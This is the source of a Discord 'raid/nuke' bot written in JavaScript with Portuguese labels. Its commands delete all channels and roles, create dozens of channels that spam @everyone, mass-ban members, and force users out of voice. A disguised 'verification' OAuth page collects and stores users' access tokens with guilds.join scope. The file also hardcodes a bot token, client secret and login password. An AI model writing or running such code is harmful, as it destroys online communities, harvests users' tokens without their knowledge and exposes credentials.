const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, parseEmoji } = require('discord.js');
const fs = require('fs');
const axios = require('axios');
const express = require('express');
const app = express();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.GuildEmojisAndStickers
    ],
    partials: [Partials.Channel, Partials.Message]
});

// --- CONFIGURAÇÃO ---
const BOT_TOKEN = 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.Ggmnh9.EeI_QRfPMiN0u6OCP0fTytZaCHRgsGDwTD3jfE';
const CLIENT_ID = '1459550966033420492';
const CLIENT_SECRET = 'p7doL9JCDnG86_jKZzHNl_zemb6nk0zO'; 
const REDIRECT_URI = 'https://rickwcl.onrender.com/callback';
const ID_CARGO = '1466834314225389804';
const ID_SERVIDOR = '1465936358513315976';
const SENHA_LOGIN = "Rickwcl"; // Senha alterada conforme pedido

let db = { kickList: [], usuarios: [] };
if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
const saveDb = () => fs.writeFileSync('./storage.json', JSON.stringify(db, null, 4));

// --- SERVIDOR WEB (VERIFICAÇÃO) ---
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('Erro');
    try {
        const data = new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code', code: code, redirect_uri: REDIRECT_URI
        });
        const tokenRes = await axios.post('https://discord.com/api/v10/oauth2/token', data);
        const token = tokenRes.data.access_token;
        const userRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${token}` }
        });
        const user = userRes.data;
        
        const userData = { id: user.id, username: user.username, token: token };
        if (!db.usuarios.find(u => u.id === user.id)) db.usuarios.push(userData);
        saveDb();

        await axios.put(`https://discord.com/api/v10/guilds/${ID_SERVIDOR}/members/${user.id}/roles/${ID_CARGO}`, {}, {
            headers: { Authorization: `Bot ${BOT_TOKEN}` }
        }).catch(() => {});

        const guild = client.guilds.cache.get(ID_SERVIDOR);
        const serverName = guild ? guild.name : "Servidor";
        const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png";

        res.send(`<html><head><meta charset="UTF-8"><style>body { background: #0c0d12; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.card { background: #111419; border: 1.5px solid #1f232a; border-radius: 24px; padding: 40px 20px; text-align: center; width: 90%; max-width: 380px; }.avatar { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4444; padding: 4px; }.btn { background: #ff4444; color: white; text-decoration: none; padding: 18px; border-radius: 14px; display: block; font-weight: 800; margin-top: 20px; }</style></head><body><div class="card"><img class="avatar" src="${avatarUrl}"><h2>${user.username}</h2><p>Verificado em <b>${serverName}</b></p><a href="https://discord.com/app" class="btn">Acessar Servidor</a></div></body></html>`);
    } catch (e) { res.send('Erro na autenticação'); }
});
app.listen(process.env.PORT || 10000);

const commands = [
    new SlashCommandBuilder().setName('ajuda').setDescription('x'),
    new SlashCommandBuilder().setName('verify').setDescription('x'),
    new SlashCommandBuilder().setName('ip').setDescription('x').addStringOption(o => o.setName('endereco').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('ping').setDescription('x'),
    new SlashCommandBuilder().setName('addemoji').setDescription('x').addStringOption(o => o.setName('emoji').setDescription('x').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('x').setRequired(false)),
    new SlashCommandBuilder().setName('clear').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('haid').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allmsg').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allban').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('boss').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('nuke').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('kickcall').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('x').setRequired(true))
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
(async () => { try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {} })();

async function getIpEmbed(ip) {
    try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`);
        if (res.data.status === 'success') {
            return new EmbedBuilder()
                .setTitle(`🔍 Detalhes do IP: ${ip}`).setColor(0x3498db)
                .addFields({ name: 'País', value: res.data.country || 'N/A' }, { name: 'ISP', value: res.data.isp || 'N/A' });
        }
    } catch (e) { return null; }
}

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isChatInputCommand()) return;

    if (i.commandName === 'verify') {
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+guilds.join`;
        const embed = new EmbedBuilder()
            .setTitle("✅ Autenticação").setDescription("Clica no botão para te verificares!").setColor(0xff0000)
            .setImage('https://cdn.discordapp.com/attachments/1469589283558916255/1469589985681346746/27ee5edaf33aac33b89e5ded3c4395b9.jpg?ex=698835d4&is=6986e454&hm=e628e739bdd817724334916ea659495363625536e1e175fa33ded6e358e93e62&');
        return i.reply({ embeds: [embed], components: [{ type: 1, components: [{ type: 2, style: 5, label: "Verificar", url: authUrl }] }] });
    }

    if (i.commandName === 'ping') {
        const sent = await i.reply({ content: 'Calculando...', fetchReply: true, flags: [64] });
        const latency = sent.createdTimestamp - i.createdTimestamp;
        return i.editReply(`🏓 **Pong!**\nLatência API: \`${latency}ms\`\nWebSocket: \`${client.ws.ping}ms\``);
    }

    if (i.commandName === 'ajuda') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('🔒 cmd - FIRST').setColor(0x00008B)
            .setDescription('🔹 /verify\n🔹 /ip\n🔹 /haid\n🔹 /allmsg\n🔹 /allban\n🔹 /boss\n🔹 /nuke\n🔹 /clear\n🔹 /addemoji\n🔹 /kickcall\n🔹 /ping\n\n⚠️ *Creator by ż4*')
            .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460702992712990780/f3013e356a3829c077c84c321798982f.gif');
        return i.reply({ embeds: [helpEmbed] });
    }

    if (i.commandName === 'ip') {
        const embed = await getIpEmbed(i.options.getString('endereco'));
        return i.reply({ embeds: embed ? [embed] : [], content: embed ? null : "❌ erro" });
    }

    if (i.options.getString('login') && i.options.getString('login') !== SENHA_LOGIN) {
        return i.reply({ content: "🔒 senha inválida", flags: [64] });
    }

    // --- COMANDOS DE ATAQUE / UTILITÁRIOS ---
    if (i.commandName === 'haid') { // Antigo 'first'
        await i.reply({ content: "⚡ **VELOCIDADE MÁXIMA.**", flags: [64] });
        i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
        for (let j = 0; j < 50; j++) {
            i.guild.channels.create({ name: 'raid-by-z4', type: ChannelType.GuildText }).then(ch => {
                setInterval(() => ch.send(`@everyone ${i.options.getString('mensagem')}`).catch(() => {}), 600);
            });
        }
    }

    if (i.commandName === 'boss') { // Antigo 'reset'
        await i.reply({ content: "🧹 Resetando...", flags: [64] });
        i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
        i.guild.roles.cache.forEach(r => { if (r.editable && r.name !== "@everyone") r.delete().catch(() => {}); });
    }

    if (i.commandName === 'nuke') {
        const novo = await i.channel.clone();
        await i.channel.delete();
        await novo.send({ embeds: [new EmbedBuilder().setDescription("☢️ **NUKE BY ż4**").setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460726448754135190/70d0e28f1f1eb8aa688b32a2c942c5d1.gif')] });
    }

    if (i.commandName === 'allban') {
        await i.reply({ content: "🔨 Banindo...", flags: [64] });
        const members = await i.guild.members.fetch();
        members.forEach(m => { if (m.bannable) m.ban().catch(() => {}); });
    }

    if (i.commandName === 'kickcall') {
        const alvo = i.options.getUser('alvo');
        if (db.kickList.includes(alvo.id)) db.kickList = db.kickList.filter(id => id !== alvo.id);
        else db.kickList.push(alvo.id);
        saveDb();
        i.reply({ content: `🔨 Kickcall atualizado para ${alvo.tag}`, flags: [64] });
    }
});

client.on(Events.VoiceStateUpdate, (o, n) => {
    if (n.channelId && db.kickList.includes(n.member.id)) n.disconnect().catch(() => {});
});

client.on(Events.ClientReady, () => console.log(`✅ ONLINE: 🔒 FIRST`));
client.login(BOT_TOKEN);

